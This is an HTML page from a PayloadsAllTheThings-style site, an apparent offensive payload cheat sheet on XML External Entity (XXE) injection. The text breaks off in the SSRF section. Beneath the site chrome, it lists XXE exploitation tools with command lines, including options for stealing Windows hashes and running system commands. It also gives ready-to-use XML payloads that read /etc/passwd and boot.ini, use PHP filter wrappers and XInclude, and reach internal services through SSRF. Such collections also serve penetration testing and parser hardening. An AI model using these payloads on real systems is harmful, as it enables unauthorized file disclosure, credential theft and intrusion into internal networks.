<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="XML External Entity" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server." />
<meta property="og:description" content="An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server." />
<link rel="canonical" href="http://localhost:4000/XXE-Injection/" />
<meta property="og:url" content="http://localhost:4000/XXE-Injection/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-04-25T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="XML External Entity" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"XML External Entity","dateModified":"2021-04-25T00:00:00+07:00","datePublished":"2021-04-25T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/XXE-Injection/"},"url":"http://localhost:4000/XXE-Injection/","description":"An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>XML External Entity | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>XML External Entity</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>XML External Entity</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, Apr 25, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Apr 25, 2021
  

  <i class="unloaded">2021-04-25T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2341 words">13 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <blockquote>
  <p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.</p>
</blockquote>

<p><strong>Internal Entity</strong>: If an entity is declared within a DTD it is called as internal entity.  <br />
Syntax: <code class="language-plaintext highlighter-rouge">&lt;!ENTITY entity_name "entity_value"&gt;</code></p>

<p><strong>External Entity</strong>: If an entity is declared outside a DTD it is called as external entity. Identified by <code class="language-plaintext highlighter-rouge">SYSTEM</code>.  <br />
Syntax: <code class="language-plaintext highlighter-rouge">&lt;!ENTITY entity_name SYSTEM "entity_value"&gt;</code></p>

<h2 id="summary">Summary</h2>

<ul>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#detect-the-vulnerability">Detect the vulnerability</a></li>
  <li><a href="#exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</a>
    <ul>
      <li><a href="#classic-xxe">Classic XXE</a></li>
      <li><a href="#classic-xxe-base64-encoded">Classic XXE Base64 encoded</a></li>
      <li><a href="#php-wrapper-inside-xxe">PHP Wrapper inside XXE</a></li>
      <li><a href="#xinclude-attacks">XInclude attacks</a></li>
    </ul>
  </li>
  <li><a href="#exploiting-xxe-to-perform-SSRF-attacks">Exploiting XXE to perform SSRF attacks</a></li>
  <li><a href="#exploiting-xxe-to-perform-a-deny-of-service">Exploiting XXE to perform a deny of service</a>
    <ul>
      <li><a href="#billion-laugh-attack">Billion Laugh Attack</a></li>
    </ul>
  </li>
  <li><a href="#error-based-xxe">Error Based XXE</a></li>
  <li><a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band</a>
    <ul>
      <li><a href="#blind-xxe">Blind XXE</a></li>
      <li><a href="#xxe-oob-attack-yusonov---2013">XXE OOB Attack (Yunusov, 2013)</a></li>
      <li><a href="#xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</a></li>
      <li><a href="#xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</a></li>
    </ul>
  </li>
  <li><a href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</a></li>
  <li><a href="#xxe-in-exotic-files">XXE in exotic files</a>
    <ul>
      <li><a href="#xxe-inside-svg">XXE inside SVG</a></li>
      <li><a href="#xxe-inside-soap">XXE inside SOAP</a></li>
      <li><a href="#xxe-inside-docx-file">XXE inside DOCX file</a></li>
      <li><a href="#xxe-inside-xlsx-file">XXE inside XLSX file</a></li>
      <li><a href="#xxe-inside-dtd-file">XXE inside DTD file</a></li>
    </ul>
  </li>
  <li><a href="#xxe-waf-bypass-via-convert-character-encoding">XXE WAF Bypass via convert character encoding</a></li>
</ul>

<h2 id="tools">Tools</h2>

<ul>
  <li><a href="https://github.com/staaldraad/xxeserv">xxeftp</a> - A mini webserver with FTP support for XXE payloads
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>sudo ./xxeftp -uno 443
./xxeftp -w -wps 5555
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/lc/230-OOB">230-OOB</a> - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via <a href="http://xxe.sh/">http://xxe.sh/</a>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ python3 230.py 2121
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
    <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="c"># Enumerating /etc directory in HTTPS application:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--path</span><span class="o">=</span>/etc <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--ssl</span>
<span class="c"># Enumerating /etc directory using gopher for OOB method:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--path</span><span class="o">=</span>/etc <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--oob</span><span class="o">=</span>gopher
<span class="c"># Second order exploitation:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--path</span><span class="o">=</span>/etc <span class="nt">--file</span><span class="o">=</span>/tmp/vulnreq.txt <span class="nt">--2ndfile</span><span class="o">=</span>/tmp/2ndreq.txt
<span class="c"># Bruteforcing files using HTTP out of band method and netdoc protocol:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--brute</span><span class="o">=</span>/tmp/filenames.txt <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--oob</span><span class="o">=</span>http <span class="nt">--netdoc</span>
<span class="c"># Enumerating using direct exploitation:</span>
ruby XXEinjector.rb <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--path</span><span class="o">=</span>/etc <span class="nt">--direct</span><span class="o">=</span>UNIQUEMARK
<span class="c"># Enumerating unfiltered ports:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--enumports</span><span class="o">=</span>all
<span class="c"># Stealing Windows hashes:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--hashes</span>
<span class="c"># Uploading files using Java jar:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--upload</span><span class="o">=</span>/tmp/uploadfile.pdf
<span class="c"># Executing system commands using PHP expect:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--oob</span><span class="o">=</span>http <span class="nt">--phpfilter</span> <span class="nt">--expect</span><span class="o">=</span><span class="nb">ls</span>
<span class="c"># Testing for XSLT injection:</span>
ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>192.168.0.2 <span class="nt">--file</span><span class="o">=</span>/tmp/req.txt <span class="nt">--xslt</span>
<span class="c"># Log requests only:</span>
ruby XXEinjector.rb <span class="nt">--logger</span> <span class="nt">--oob</span><span class="o">=</span>http <span class="nt">--output</span><span class="o">=</span>/tmp/out.txt
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a> - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>ruby server.rb
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/whitel1st/docem">docem</a> - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html">otori</a> - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="detect-the-vulnerability">Detect the vulnerability</h2>

<p>Basic entity test, when the XML parser parses the external entities the result should contain “John” in <code class="language-plaintext highlighter-rouge">firstName</code> and “Doe” in <code class="language-plaintext highlighter-rouge">lastName</code>. Entities are defined inside the <code class="language-plaintext highlighter-rouge">DOCTYPE</code> element.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt;</span> ]&gt;
 <span class="nt">&lt;userInfo&gt;</span>
  <span class="nt">&lt;firstName&gt;</span>John<span class="nt">&lt;/firstName&gt;</span>
  <span class="nt">&lt;lastName&gt;</span><span class="ni">&amp;example;</span><span class="nt">&lt;/lastName&gt;</span>
 <span class="nt">&lt;/userInfo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It might help to set the <code class="language-plaintext highlighter-rouge">Content-Type: application/xml</code> in the request when sending XML payload to the server.</p>

<h2 id="exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve files</h2>

<h3 id="classic-xxe">Classic XXE</h3>

<p>We try to display the content of the file <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;</span>]&gt;<span class="nt">&lt;root&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/root&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;</span>
<span class="cp">&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
]&gt;
<span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
  <span class="cp">&lt;!DOCTYPE foo [  
  &lt;!ELEMENT foo ANY &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [  
  &lt;!ELEMENT foo ANY &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>:warning: <code class="language-plaintext highlighter-rouge">SYSTEM</code> and <code class="language-plaintext highlighter-rouge">PUBLIC</code> are almost synonym.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [  
  &lt;!ELEMENT foo ANY &gt;</span>
  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="classic-xxe-base64-encoded">Classic XXE Base64 encoded</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt;</span> %init; ]&gt;<span class="nt">&lt;foo/&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="php-wrapper-inside-xxe">PHP Wrapper inside XXE</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</span> ]&gt;
<span class="nt">&lt;contacts&gt;</span>
  <span class="nt">&lt;contact&gt;</span>
    <span class="nt">&lt;name&gt;</span>Jean <span class="ni">&amp;xxe;</span> Dupont<span class="nt">&lt;/name&gt;</span>
    <span class="nt">&lt;phone&gt;</span>00 11 22 33 44<span class="nt">&lt;/phone&gt;</span>
    <span class="nt">&lt;address&gt;</span>42 rue du CTF<span class="nt">&lt;/address&gt;</span>
    <span class="nt">&lt;zipcode&gt;</span>75000<span class="nt">&lt;/zipcode&gt;</span>
    <span class="nt">&lt;city&gt;</span>Paris<span class="nt">&lt;/city&gt;</span>
  <span class="nt">&lt;/contact&gt;</span>
<span class="nt">&lt;/contacts&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" &gt;</span>
]&gt;
<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="xinclude-attacks">XInclude attacks</h3>

<p>When you can’t modify the <strong>DOCTYPE</strong> element use the <strong>XInclude</strong> to target</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;foo</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xi:include</span> <span class="na">parse=</span><span class="s">"text"</span> <span class="na">href=</span><span class="s">"file:///etc/passwd"</span><span class="nt">/&gt;&lt;/foo&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="exploiting-xxe-to-perform-ssrf-attacks">Exploiting XXE to perform SSRF attacks</h2>

<p>XXE can be combined with the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">SSRF vulnerability</a> to target another service on the network.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" &gt;</span>
]&gt;
